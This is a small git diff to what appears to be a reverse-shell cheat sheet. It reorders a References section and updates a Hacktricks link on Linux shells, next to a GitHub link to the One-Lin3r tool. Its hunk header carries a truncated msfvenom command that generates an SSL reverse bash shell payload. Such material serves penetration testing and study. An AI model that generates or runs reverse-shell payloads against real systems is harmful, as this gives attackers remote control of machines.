@@ -51,10 +51,10 @@ $ msfvenom -p cmd/unix/reverse_bash_telnet_ssl handlersslcert=[/path/to/file.pem
 ---
 ## References
 
-### Hacktricks
-
-- [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)
-
 ### Github
 
 - [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
+
+### Hacktricks
+
+- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/shells/shells/linux.html)
